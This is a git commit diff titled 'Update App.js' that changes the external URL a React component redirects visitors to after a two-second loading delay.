d724ca0784947609b2fea664df5092a2a3313e0c
husknet <127146284+husknet@users.noreply.github.com>
2024-10-17 11:53:55 -0300

    Update App.js

--- src/App.js
+++ src/App.js
@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://si.wesp.fi/';
+            window.location.href = 'https://book.gayler.uk';
         }, 2000);
 
         return () => clearTimeout(timer);
